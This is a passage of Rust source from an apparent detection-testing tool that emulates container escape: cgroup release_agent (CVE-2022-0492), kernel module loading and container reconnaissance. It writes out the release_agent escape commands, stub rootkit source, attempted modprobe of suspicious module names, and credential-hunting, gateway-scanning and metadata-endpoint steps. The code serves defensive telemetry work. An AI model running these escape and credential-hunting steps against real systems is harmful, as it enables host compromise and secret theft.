                                                artefacts.push(host_marker_path.to_string());
                                                info!("[T1611-CGROUP] [CRITICAL] Container escape via release_agent SUCCESSFUL");
                                            } else {
                                                findings.push("[INFO] Marker file not found - release_agent may not have executed".to_string());
                                                debug!("[T1611-CGROUP] Marker file not found at: {}", host_marker_path);
                                            }
                                        } else {
                                            findings.push("[EXEC] cgroup.procs trigger - BLOCKED".to_string());
                                        }
                                    }
                                }
                            }
                            
                            // Cleanup: unmount
                            let _ = Command::new("umount").args([&cgroup_test_dir]).output().await;
                        } else {
                            findings.push(format!("[EXEC] mount -t cgroup - BLOCKED: {}", stderr.trim()));
                        }
                    }
                    Err(e) => {
                        findings.push(format!("[EXEC] mount -t cgroup - ERROR: {}", e));
                    }
                }
                
                // Also try memory cgroup subsystem (more commonly available)
                info!("[T1611-CGROUP] Executing: mount -t cgroup -o memory cgroup {}", cgroup_test_dir);
                let mount_memory = Command::new("mount")
                    .args(["-t", "cgroup", "-o", "memory", "cgroup", &cgroup_test_dir])
                    .output()
                    .await;
                
                if let Ok(output) = mount_memory {
                    if output.status.success() {
                        findings.push("[CRITICAL] mount -t cgroup -o memory - SUCCESS".to_string());
                        let _ = Command::new("umount").args([&cgroup_test_dir]).output().await;
                    }
                }
            }
            
            // Enumerate existing cgroup mounts
            let mounts = enumerate_mounts_with_prefix("T1611-CGROUP");
            let cgroup_mounts: Vec<_> = mounts.iter()
                .filter(|m| m.fstype == "cgroup" || m.fstype == "cgroup2")
                .collect();
            
            debug!("[T1611-CGROUP] Found {} cgroup mounts", cgroup_mounts.len());
            
            for mount in &cgroup_mounts {
                findings.push(format!("[INFO] cgroup mount: {} -> {} ({})", 
                    mount.source, mount.target, mount.fstype));
                
                // Check for release_agent file
                let release_agent_path = format!("{}/release_agent", mount.target);
                if Path::new(&release_agent_path).exists() {
                    debug!("[T1611-CGROUP] Found release_agent at: {}", release_agent_path);
                    
                    // Try to cat the release_agent
                    info!("[T1611-CGROUP] Executing: cat {}", release_agent_path);
                    if let Ok(cat_output) = Command::new("cat").args([&release_agent_path]).output().await {
                        if cat_output.status.success() {
                            let content = String::from_utf8_lossy(&cat_output.stdout);
                            findings.push(format!("[EXEC] cat {} - SUCCESS: '{}'", release_agent_path, content.trim()));
                        }
                    }
                }
                
                // Check notify_on_release
                let notify_path = format!("{}/notify_on_release", mount.target);
                if Path::new(&notify_path).exists() {
                    info!("[T1611-CGROUP] Executing: cat {}", notify_path);
                    if let Ok(content) = fs::read_to_string(&notify_path) {
                        let enabled = content.trim() == "1";
                        findings.push(format!("[INFO] notify_on_release at {} = {}", notify_path, enabled));
                    }
                }
            }
            
            // Check for cgroup v2 unified hierarchy
            if Path::new("/sys/fs/cgroup/cgroup.controllers").exists() {
                findings.push("[INFO] cgroup v2 unified hierarchy detected".to_string());
                debug!("[T1611-CGROUP] cgroup v2 detected");
                
                // cat cgroup.controllers
                info!("[T1611-CGROUP] Executing: cat /sys/fs/cgroup/cgroup.controllers");
                if let Ok(controllers) = fs::read_to_string("/sys/fs/cgroup/cgroup.controllers") {
                    findings.push(format!("[INFO] cgroup.controllers: {}", controllers.trim()));
                }
            }
            
            // Simulate payload creation
            if simulate_payload {
                let payload_file = format!("{}/simulated_escape_payload.sh", output_dir);
                if let Ok(mut f) = File::create(&payload_file) {
                    let payload = r#"#!/bin/bash
# SignalBench T1611-CGROUP - Simulated cgroup Escape Payload
# CVE-2022-0492 - cgroup release_agent container escape
# This script demonstrates the escape technique - NOT for malicious use

# The actual exploit would:
# 1. Mount a cgroup filesystem inside the container
# 2. Create a new cgroup
# 3. Set notify_on_release=1
# 4. Write a payload script path to release_agent
# 5. Trigger cgroup release by killing the last process in the cgroup
# 6. The payload executes on the HOST, not in the container

echo "[SIMULATED] This payload would execute on the host"
echo "[SIMULATED] Host filesystem access via: /host"
echo "[SIMULATED] Reverse shell or other payload here"

# Actual exploit commands (for reference only):
# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# echo 1 > /tmp/cgrp/x/notify_on_release
# host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
# echo "$host_path/cmd" > /tmp/cgrp/release_agent
"#;
                    let _ = f.write_all(payload.as_bytes());
                    artefacts.push(payload_file.clone());
                    findings.push(format!("[INFO] Simulated payload created: {}", payload_file));
                    debug!("[T1611-CGROUP] Created simulated payload script");
                }
            }
            
            // Write findings report
            let report_file = format!("{}/cgroup_escape_report.txt", output_dir);
            if let Ok(mut f) = File::create(&report_file) {
                let container_env = detect_container_environment_with_prefix("T1611-CGROUP");
                let report = format!(
                    "SignalBench T1611-CGROUP - cgroup Release Agent Escape Report\n{}\n\nCVE: CVE-2022-0492\n\nContainer Environment:\n  Is Container: {}\n  Runtime: {:?}\n\nCapabilities:\n  CAP_SYS_ADMIN: {}\n\ncgroup Mounts: {}\n\nFindings:\n{}\n",
                    "=".repeat(60),
                    container_env.is_container,
                    container_env.runtime,
                    has_sys_admin,
                    cgroup_mounts.len(),
                    findings.join("\n")
                );
                let _ = f.write_all(report.as_bytes());
                artefacts.push(report_file);
            }
            
            let escape_possible = has_sys_admin && !cgroup_mounts.is_empty();
            let message = if escape_possible {
                format!("cgroup release_agent escape potentially possible - CAP_SYS_ADMIN present with {} cgroup mounts", cgroup_mounts.len())
            } else {
                "cgroup release_agent escape not feasible - missing required capabilities or mounts".to_string()
            };
            
            info!("[T1611-CGROUP] Technique complete: {}", message);
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message,
                artifacts: artefacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artefacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            debug!("[T1611-CGROUP] Starting cleanup of {} artefacts", artefacts.len());
            
            for artefact in artefacts {
                // Special handling for host marker files created via release_agent
                if artefact == "/tmp/signalbench_cgroup_escape_marker" {
                    debug!("[T1611-CGROUP] Removing host marker file");
                    // Try local removal first (marker is on host)
                    if let Err(e) = fs::remove_file(artefact) {
                        warn!("[T1611-CGROUP] Failed to remove host marker {}: {}", artefact, e);
                    } else {
                        info!("[T1611-CGROUP] Removed host marker file: {}", artefact);
                    }
                    continue;
                }
                
                let path = Path::new(artefact);
                if path.is_dir() {
                    debug!("[T1611-CGROUP] Removing directory: {}", artefact);
                    if let Err(e) = fs::remove_dir_all(path) {
                        warn!("[T1611-CGROUP] Failed to remove directory {}: {}", artefact, e);
                    }
                } else if path.is_file() {
                    debug!("[T1611-CGROUP] Removing file: {}", artefact);
                    if let Err(e) = fs::remove_file(path) {
                        warn!("[T1611-CGROUP] Failed to remove file {}: {}", artefact, e);
                    }
                }
            }
            
            info!("[T1611-CGROUP] Cleanup complete");
            Ok(())
        })
    }
}

// =============================================================================
// T1611-MODULE: Kernel Module Escape
// =============================================================================

pub struct KernelModuleEscape {}

#[async_trait]
impl AttackTechnique for KernelModuleEscape {
    fn info(&self) -> Technique {
        Technique {
            id: "T1611-MODULE".to_string(),
            name: "Kernel Module Escape".to_string(),
            description: "Container escape via kernel module loading (CAP_SYS_MODULE). Runs lsmod, modinfo, cat /proc/modules, uname -r, ls /lib/modules, modprobe --show-depends (read-only). NEVER executes insmod - module loading is simulated by checking tool availability. Based on Unit42 container breakout research.".to_string(),
            category: "privilege_escalation".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "output_dir".to_string(),
                    description: "Directory for kernel module escape simulation output".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_module_escape".to_string()),
                },
                TechniqueParameter {
                    name: "enumerate_modules".to_string(),
                    description: "Enumerate currently loaded kernel modules".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
                TechniqueParameter {
                    name: "test_insmod".to_string(),
                    description: "SIMULATED insmod check - verifies tool availability but NEVER executes".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
            ],
            detection: "Monitor for: lsmod/modinfo/modprobe execution, cat /proc/modules, ls /lib/modules, uname -r, CAP_SYS_MODULE capability checks, /proc/kallsyms access. Alert on module enumeration from containers.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["root".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let output_dir = config
                .parameters
                .get("output_dir")
                .cloned()
                .unwrap_or_else(|| "/tmp/signalbench_module_escape".to_string());
            
            let enumerate_modules = config
                .parameters
                .get("enumerate_modules")
                .map(|v| v.to_lowercase() == "true")
                .unwrap_or(true);
            
            debug!("[T1611-MODULE] Starting Kernel Module Escape technique");
            debug!("[T1611-MODULE] Output directory: {}", output_dir);
            debug!("[T1611-MODULE] Enumerate modules: {}", enumerate_modules);
            
            let mut artefacts = Vec::new();
            let mut findings = Vec::new();
            
            // Check capabilities
            let caps = parse_capabilities_with_prefix("T1611-MODULE");
            let has_sys_module = has_capability(&caps, CAP_SYS_MODULE);
            let has_sys_admin = has_capability(&caps, CAP_SYS_ADMIN);
            
            debug!("[T1611-MODULE] CAP_SYS_MODULE present: {}", has_sys_module);
            debug!("[T1611-MODULE] CAP_SYS_ADMIN present: {}", has_sys_admin);
            
            let test_insmod = config
                .parameters
                .get("test_insmod")
                .map(|v| v.to_lowercase() == "true")
                .unwrap_or(true);
            
            if dry_run {
                info!("[DRY RUN] Would perform Kernel Module Escape:");
                info!("[DRY RUN] - Execute: lsmod");
                info!("[DRY RUN] - Execute: cat /proc/modules");
                info!("[DRY RUN] - Execute: uname -r");
                info!("[DRY RUN] - Execute: ls -la /lib/modules/$(uname -r)");
                if enumerate_modules {
                    info!("[DRY RUN] - Execute: modinfo for common modules");
                }
                if test_insmod {
                    info!("[DRY RUN] - SIMULATED: insmod availability check (NEVER executes)");
                    info!("[DRY RUN] - Execute: modprobe --show-depends vfat (read-only, safe)");
                }
                info!("[DRY RUN] - Create simulated malicious module source");
                info!("[DRY RUN] - Write findings to: {}", output_dir);
                
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would perform kernel module escape".to_string(),
                    artifacts: vec![output_dir],
                    cleanup_required: false,
                });
            }
            
            // Create output directory
            debug!("[T1611-MODULE] Creating output directory");
            if let Err(e) = fs::create_dir_all(&output_dir) {
                warn!("[T1611-MODULE] Failed to create output directory: {}", e);
            } else {
                artefacts.push(output_dir.clone());
            }
            
            // Check CAP_SYS_MODULE
            if has_sys_module {
                findings.push("[CRITICAL] CAP_SYS_MODULE present - kernel module loading possible".to_string());
                info!("[T1611-MODULE] [CRITICAL] CAP_SYS_MODULE capability detected");
            } else {
                findings.push("[SAFE] CAP_SYS_MODULE not present - module loading blocked".to_string());
                debug!("[T1611-MODULE] No CAP_SYS_MODULE - escape not feasible via modules");
            }
            
            if has_sys_admin {
                findings.push("[WARNING] CAP_SYS_ADMIN also present - expanded kernel access".to_string());
            }
            
            // =========================================================
            // Execute commands for telemetry
            // =========================================================
            
            // 1. lsmod - List loaded modules
            info!("[T1611-MODULE] Executing: lsmod");
            let lsmod_output = Command::new("lsmod")
                .output()
                .await;
            
            match lsmod_output {
                Ok(output) => {
                    if output.status.success() {
                        let module_count = String::from_utf8_lossy(&output.stdout).lines().count() - 1;
                        findings.push(format!("[EXEC] lsmod - SUCCESS ({} modules)", module_count));
                        let lsmod_file = format!("{}/lsmod_output.txt", output_dir);
                        if let Ok(mut f) = File::create(&lsmod_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(lsmod_file);
                        }
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] lsmod - ERROR: {}", e));
                }
            }
            
            // 2. cat /proc/modules
            info!("[T1611-MODULE] Executing: cat /proc/modules");
            let proc_modules = Command::new("cat")
                .args(["/proc/modules"])
                .output()
                .await;
            
            match proc_modules {
                Ok(output) => {
                    if output.status.success() {
                        findings.push("[EXEC] cat /proc/modules - SUCCESS".to_string());
                        let proc_file = format!("{}/proc_modules.txt", output_dir);
                        if let Ok(mut f) = File::create(&proc_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(proc_file);
                        }
                        
                        // Look for security-relevant modules
                        let content = String::from_utf8_lossy(&output.stdout);
                        let security_modules = ["selinux", "apparmor", "tomoyo", "smack", "seccomp"];
                        for sec_mod in &security_modules {
                            if content.to_lowercase().contains(sec_mod) {
                                findings.push(format!("[INFO] Security module loaded: {}", sec_mod));
                            }
                        }
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] cat /proc/modules - ERROR: {}", e));
                }
            }
            
            // 3. uname -r - Get kernel version
            info!("[T1611-MODULE] Executing: uname -r");
            let uname_output = Command::new("uname")
                .args(["-r"])
                .output()
                .await;
            
            let mut kernel_version = String::new();
            match uname_output {
                Ok(output) => {
                    if output.status.success() {
                        kernel_version = String::from_utf8_lossy(&output.stdout).trim().to_string();
                        findings.push(format!("[EXEC] uname -r - SUCCESS: {}", kernel_version));
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] uname -r - ERROR: {}", e));
                }
            }
            
            // 4. ls -la /lib/modules/$(uname -r)
            if !kernel_version.is_empty() {
                let modules_dir = format!("/lib/modules/{}", kernel_version);
                info!("[T1611-MODULE] Executing: ls -la {}", modules_dir);
                let ls_modules = Command::new("ls")
                    .args(["-la", &modules_dir])
                    .output()
                    .await;
                
                match ls_modules {
                    Ok(output) => {
                        if output.status.success() {
                            findings.push(format!("[EXEC] ls -la {} - SUCCESS", modules_dir));
                            let ls_file = format!("{}/lib_modules_listing.txt", output_dir);
                            if let Ok(mut f) = File::create(&ls_file) {
                                let _ = f.write_all(output.stdout.as_slice());
                                artefacts.push(ls_file);
                            }
                        }
                    }
                    Err(e) => {
                        findings.push(format!("[EXEC] ls /lib/modules - ERROR: {}", e));
                    }
                }
            }
            
            // 5. modinfo for common modules
            if enumerate_modules {
                let common_modules = ["ip_tables", "nf_conntrack", "bridge", "overlay", "veth"];
                for module_name in &common_modules {
                    info!("[T1611-MODULE] Executing: modinfo {}", module_name);
                    let modinfo_output = Command::new("modinfo")
                        .args([*module_name])
                        .output()
                        .await;
                    
                    if let Ok(output) = modinfo_output {
                        if output.status.success() {
                            findings.push(format!("[EXEC] modinfo {} - SUCCESS", module_name));
                        }
                    }
                }
            }
            
            // Safe module loading simulations (never actually loads modules)
            // SAFETY: We NEVER execute real insmod/modprobe commands that could load modules.
            // Instead, we simulate what would happen and check for tool availability.
            if test_insmod {
                // 6. SIMULATED insmod - Log what WOULD happen, but NEVER execute
                // This generates telemetry by checking if insmod exists and is executable
                info!("[T1611-MODULE] SIMULATED: insmod check (never executes real module loading)");
                let insmod_path = Path::new("/sbin/insmod");
                let insmod_exists = insmod_path.exists();
                if insmod_exists {
                    findings.push("[SIMULATED] insmod available - attacker could load kernel modules".to_string());
                    findings.push("[SAFE] SignalBench does NOT execute real insmod commands".to_string());
                    
                    // Check if we have CAP_SYS_MODULE (would be needed for real attack)
                    if has_sys_module {
                        findings.push("[CRITICAL] CAP_SYS_MODULE + insmod available = kernel module loading possible".to_string());
                    }
                } else {
                    findings.push("[INFO] insmod not found at /sbin/insmod".to_string());
                }
                
                // 7. modprobe --show-depends ONLY - never loads, just shows dependencies
                // --show-depends is read-only and safe (only shows what modules would be needed)
                info!("[T1611-MODULE] Executing: modprobe --show-depends vfat");
                let modprobe_output = Command::new("modprobe")
                    .args(["--show-depends", "vfat"])
                    .output()
                    .await;
                
                match modprobe_output {
                    Ok(output) => {
                        let stdout = String::from_utf8_lossy(&output.stdout);
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        if output.status.success() {
                            findings.push(format!("[EXEC] modprobe --show-depends vfat - SUCCESS ({})", stdout.lines().count()));
                            findings.push("[SAFE] --show-depends is read-only, no modules loaded".to_string());
                        } else {
                            findings.push(format!("[EXEC] modprobe --show-depends - {}", stderr.trim()));
                        }
                    }
                    Err(e) => {
                        findings.push(format!("[EXEC] modprobe --show-depends - ERROR: {}", e));
                    }
                }
                
                // 8. Try to read /proc/kallsyms (kernel symbols)
                info!("[T1611-MODULE] Executing: head -50 /proc/kallsyms");
                let kallsyms = Command::new("head")
                    .args(["-50", "/proc/kallsyms"])
                    .output()
                    .await;
                
                match kallsyms {
                    Ok(output) => {
                        if output.status.success() {
                            let content = String::from_utf8_lossy(&output.stdout);
                            if content.contains("0000000000000000") {
                                findings.push("[SAFE] /proc/kallsyms - Addresses hidden (kptr_restrict)".to_string());
                            } else {
                                findings.push("[CRITICAL] /proc/kallsyms - Kernel addresses EXPOSED".to_string());
                            }
                            let kallsyms_file = format!("{}/kallsyms_sample.txt", output_dir);
                            if let Ok(mut f) = File::create(&kallsyms_file) {
                                let _ = f.write_all(output.stdout.as_slice());
                                artefacts.push(kallsyms_file);
                            }
                        }
                    }
                    Err(e) => {
                        findings.push(format!("[EXEC] head /proc/kallsyms - ERROR: {}", e));
                    }
                }
                
                // 9. Attempt to load a fake suspicious module (signalbench_rootkit)
                // This generates XDR telemetry for detecting malicious module loading attempts
                // The module does not exist so modprobe will fail safely
                info!("[T1611-MODULE] Executing: modprobe signalbench_rootkit (intentionally fails - generates telemetry)");
                let rootkit_modprobe = Command::new("modprobe")
                    .args(["signalbench_rootkit"])
                    .output()
                    .await;
                
                match rootkit_modprobe {
                    Ok(output) => {
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        if output.status.success() {
                            // This should never succeed - if it does, something is very wrong
                            findings.push("[CRITICAL] modprobe signalbench_rootkit - UNEXPECTED SUCCESS".to_string());
                            warn!("[T1611-MODULE] [UNEXPECTED] modprobe signalbench_rootkit succeeded - this should not happen");
                        } else if stderr.contains("not found") || stderr.contains("FATAL") {
                            // Expected failure - module does not exist
                            findings.push("[EXEC] modprobe signalbench_rootkit - FAILED (module not found - expected)".to_string());
                            findings.push("[TELEMETRY] XDR should detect modprobe attempt for suspicious module name".to_string());
                        } else if stderr.contains("Permission denied") || stderr.contains("Operation not permitted") {
                            // Permission denied - also generates good telemetry
                            findings.push("[EXEC] modprobe signalbench_rootkit - BLOCKED (permission denied)".to_string());
                            findings.push("[TELEMETRY] Module loading attempt blocked by kernel security".to_string());
                        } else {
                            findings.push(format!("[EXEC] modprobe signalbench_rootkit - {}", stderr.trim()));
                        }
                    }
                    Err(e) => {
                        findings.push(format!("[EXEC] modprobe signalbench_rootkit - ERROR: {}", e));
                    }
                }
                
                // 10. Attempt modprobe for other suspicious module names to generate telemetry
                let suspicious_modules = ["signalbench_backdoor", "signalbench_keylogger", "rootkit"];
                for module_name in &suspicious_modules {
                    info!("[T1611-MODULE] Executing: modprobe {} (intentionally fails - generates telemetry)", module_name);
                    let modprobe_suspicious = Command::new("modprobe")
                        .args([*module_name])
                        .output()
                        .await;
                    
                    if let Ok(output) = modprobe_suspicious {
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        if output.status.success() {
                            findings.push(format!("[CRITICAL] modprobe {} - UNEXPECTED SUCCESS", module_name));
                        } else {
                            findings.push(format!("[EXEC] modprobe {} - FAILED (expected) - generates XDR telemetry", module_name));
                        }
                        debug!("[T1611-MODULE] modprobe {} stderr: {}", module_name, stderr.trim());
                    }
                }
            }
            
            // Check for module loading tools
            let tools = [
                ("/sbin/insmod", "insmod"),
                ("/sbin/modprobe", "modprobe"),
                ("/sbin/rmmod", "rmmod"),
                ("/bin/kmod", "kmod"),
            ];
            
            for (path, name) in &tools {
                if Path::new(path).exists() {
                    findings.push(format!("[INFO] Module tool available: {} ({})", name, path));
                    debug!("[T1611-MODULE] Found module tool: {}", path);
                }
            }
            
            // Check kernel version for known vulnerabilities
            if let Ok(version) = fs::read_to_string("/proc/version") {
                findings.push(format!("[INFO] Kernel: {}", version.trim()));
                debug!("[T1611-MODULE] Kernel version: {}", version.trim());
            }
            
            // Create simulated malicious module source (for telemetry)
            let module_source = format!("{}/simulated_rootkit.c", output_dir);
            if let Ok(mut f) = File::create(&module_source) {
                let source = r#"/*
 * SignalBench T1611-MODULE - Simulated Malicious Kernel Module
 * This is a SIMULATION for telemetry generation - NOT a real rootkit
 *
 * A real attacker with CAP_SYS_MODULE could:
 * - Load a kernel module that hides processes, files, network connections
 * - Install keyloggers at kernel level
 * - Modify syscall table to intercept system calls
 * - Disable security modules (SELinux, AppArmor)
 * - Gain persistent root access on the host
 */

#include <linux/module.h>
#include <linux/kernel.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("SignalBench Simulated Rootkit");

static int __init rootkit_init(void) {
    // SIMULATED: Would hook syscall table here
    // SIMULATED: Would hide from /proc/modules
    // SIMULATED: Would establish persistence
    printk(KERN_INFO "[SIMULATED] Rootkit loaded\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    printk(KERN_INFO "[SIMULATED] Rootkit unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
"#;
                let _ = f.write_all(source.as_bytes());
                artefacts.push(module_source.clone());
                findings.push(format!("[INFO] Simulated rootkit source created: {}", module_source));
            }
            
            // Write findings report
            let report_file = format!("{}/module_escape_report.txt", output_dir);
            if let Ok(mut f) = File::create(&report_file) {
                let container_env = detect_container_environment_with_prefix("T1611-MODULE");
                let report = format!(
                    "SignalBench T1611-MODULE - Kernel Module Escape Report\n{}\n\nContainer Environment:\n  Is Container: {}\n  Runtime: {:?}\n\nCapabilities:\n  CAP_SYS_MODULE: {}\n  CAP_SYS_ADMIN: {}\n\nFindings:\n{}\n",
                    "=".repeat(55),
                    container_env.is_container,
                    container_env.runtime,
                    has_sys_module,
                    has_sys_admin,
                    findings.join("\n")
                );
                let _ = f.write_all(report.as_bytes());
                artefacts.push(report_file);
            }
            
            let escape_possible = has_sys_module;
            let message = if escape_possible {
                "Kernel module escape possible - CAP_SYS_MODULE capability present".to_string()
            } else {
                "Kernel module escape not feasible - CAP_SYS_MODULE not available".to_string()
            };
            
            info!("[T1611-MODULE] Technique complete: {}", message);
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message,
                artifacts: artefacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artefacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            debug!("[T1611-MODULE] Starting cleanup of {} artefacts", artefacts.len());
            
            for artefact in artefacts {
                let path = Path::new(artefact);
                if path.is_dir() {
                    debug!("[T1611-MODULE] Removing directory: {}", artefact);
                    if let Err(e) = fs::remove_dir_all(path) {
                        warn!("[T1611-MODULE] Failed to remove directory {}: {}", artefact, e);
                    }
                } else if path.is_file() {
                    debug!("[T1611-MODULE] Removing file: {}", artefact);
                    if let Err(e) = fs::remove_file(path) {
                        warn!("[T1611-MODULE] Failed to remove file {}: {}", artefact, e);
                    }
                }
            }
            
            info!("[T1611-MODULE] Cleanup complete");
            Ok(())
        })
    }
}

// =============================================================================
// T1611-RECON: Container Environment Reconnaissance
// =============================================================================

pub struct ContainerReconnaissance {}

#[async_trait]
impl AttackTechnique for ContainerReconnaissance {
    fn info(&self) -> Technique {
        Technique {
            id: "T1611-RECON".to_string(),
            name: "Container Environment Reconnaissance".to_string(),
            description: "Container reconnaissance inspired by deepce. Runs hostname, id, ip addr, cat /etc/resolv.conf, env, dig, nslookup, curl to metadata endpoints, nc gateway scan, find for credential files, and kubectl commands. Generates comprehensive network and credential telemetry for container breakout detection.".to_string(),
            category: "privilege_escalation".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "output_dir".to_string(),
                    description: "Directory for reconnaissance output".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_container_recon".to_string()),
                },
                TechniqueParameter {
                    name: "scan_gateway".to_string(),
                    description: "Scan host gateway using nmap/nc".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
                TechniqueParameter {
                    name: "credential_hunt".to_string(),
                    description: "Search for credentials using find/grep".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
                TechniqueParameter {
                    name: "dns_enum".to_string(),
                    description: "Perform DNS enumeration with dig/nslookup".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
            ],
            detection: "Monitor for: hostname/id/ip/env commands, dig/nslookup DNS queries, curl to 169.254.169.254, nmap/nc port scans, find/grep for credentials, cat /etc/resolv.conf, kubectl/aws/gcloud CLI usage from containers.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let output_dir = config
                .parameters
                .get("output_dir")
                .cloned()
                .unwrap_or_else(|| "/tmp/signalbench_container_recon".to_string());
            
            let scan_gateway = config
                .parameters
                .get("scan_gateway")
                .map(|v| v.to_lowercase() == "true")
                .unwrap_or(true);
            
            let credential_hunt = config
                .parameters
                .get("credential_hunt")
                .map(|v| v.to_lowercase() == "true")
                .unwrap_or(true);
            
            debug!("[T1611-RECON] Starting Container Reconnaissance technique");
            debug!("[T1611-RECON] Output directory: {}", output_dir);
            debug!("[T1611-RECON] Scan gateway: {}", scan_gateway);
            debug!("[T1611-RECON] Credential hunt: {}", credential_hunt);
            
            let mut artefacts = Vec::new();
            let mut findings = Vec::new();
            
            let dns_enum = config
                .parameters
                .get("dns_enum")
                .map(|v| v.to_lowercase() == "true")
                .unwrap_or(true);
            
            if dry_run {
                info!("[DRY RUN] Would perform Container Reconnaissance:");
                info!("[DRY RUN] - Execute: hostname");
                info!("[DRY RUN] - Execute: id");
                info!("[DRY RUN] - Execute: ip addr");
                info!("[DRY RUN] - Execute: cat /etc/resolv.conf");
                info!("[DRY RUN] - Execute: env");
                if dns_enum {
                    info!("[DRY RUN] - Execute: dig +short");
                    info!("[DRY RUN] - Execute: nslookup kubernetes");
                }
                if credential_hunt {
                    info!("[DRY RUN] - Execute: find / -name '*.env'");
                    info!("[DRY RUN] - Execute: grep -r 'password' /app");
                    info!("[DRY RUN] - Execute: cat K8s secrets");
                }
                if scan_gateway {
                    info!("[DRY RUN] - Execute: nmap -sT gateway");
                    info!("[DRY RUN] - Execute: nc -zv gateway ports");
                }
                info!("[DRY RUN] - Execute: curl 169.254.169.254");
                info!("[DRY RUN] - Write findings to: {}", output_dir);
                
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would perform container reconnaissance".to_string(),
                    artifacts: vec![output_dir],
                    cleanup_required: false,
                });
            }
            
            // Create output directory
            debug!("[T1611-RECON] Creating output directory");
            if let Err(e) = fs::create_dir_all(&output_dir) {
                warn!("[T1611-RECON] Failed to create output directory: {}", e);
            } else {
                artefacts.push(output_dir.clone());
            }
            
            // =========================================================
            // Execute commands for telemetry
            // =========================================================
            
            // 1. hostname - Get container hostname
            info!("[T1611-RECON] Executing: hostname");
            let hostname_output = Command::new("hostname")
                .output()
                .await;
            
            match hostname_output {
                Ok(output) => {
                    if output.status.success() {
                        let hostname = String::from_utf8_lossy(&output.stdout).trim().to_string();
                        findings.push(format!("[EXEC] hostname - {}", hostname));
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] hostname - ERROR: {}", e));
                }
            }
            
            // 2. id - Current user info
            info!("[T1611-RECON] Executing: id");
            let id_output = Command::new("id")
                .output()
                .await;
            
            match id_output {
                Ok(output) => {
                    if output.status.success() {
                        let id_info = String::from_utf8_lossy(&output.stdout).trim().to_string();
                        findings.push(format!("[EXEC] id - {}", id_info));
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] id - ERROR: {}", e));
                }
            }
            
            // 3. ip addr - Network configuration
            info!("[T1611-RECON] Executing: ip addr");
            let ip_output = Command::new("ip")
                .args(["addr"])
                .output()
                .await;
            
            match ip_output {
                Ok(output) => {
                    if output.status.success() {
                        findings.push("[EXEC] ip addr - SUCCESS".to_string());
                        let ip_file = format!("{}/ip_addr.txt", output_dir);
                        if let Ok(mut f) = File::create(&ip_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(ip_file);
                        }
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] ip addr - ERROR: {}", e));
                }
            }
            
            // 4. cat /etc/resolv.conf - DNS configuration
            info!("[T1611-RECON] Executing: cat /etc/resolv.conf");
            let resolv_output = Command::new("cat")
                .args(["/etc/resolv.conf"])
                .output()
                .await;
            
            match resolv_output {
                Ok(output) => {
                    if output.status.success() {
                        findings.push("[EXEC] cat /etc/resolv.conf - SUCCESS".to_string());
                        let resolv_file = format!("{}/resolv.conf", output_dir);
                        if let Ok(mut f) = File::create(&resolv_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(resolv_file);
                        }
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] cat /etc/resolv.conf - ERROR: {}", e));
                }
            }
            
            // 5. env - Environment variables
            info!("[T1611-RECON] Executing: env");
            let env_output = Command::new("env")
                .output()
                .await;
            
            match env_output {
                Ok(output) => {
                    if output.status.success() {
                        let env_count = String::from_utf8_lossy(&output.stdout).lines().count();
                        findings.push(format!("[EXEC] env - SUCCESS ({} variables)", env_count));
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] env - ERROR: {}", e));
                }
            }
            
            // DNS Enumeration
            if dns_enum {
                // 6. dig +short - DNS queries
                info!("[T1611-RECON] Executing: dig +short kubernetes.default.svc.cluster.local");
                let dig_output = Command::new("dig")
                    .args(["+short", "kubernetes.default.svc.cluster.local"])
                    .output()
                    .await;
                
                match dig_output {
                    Ok(output) => {
                        if output.status.success() {
                            let result = String::from_utf8_lossy(&output.stdout).trim().to_string();
                            if !result.is_empty() {
                                findings.push(format!("[CRITICAL] dig kubernetes.default - {}", result));
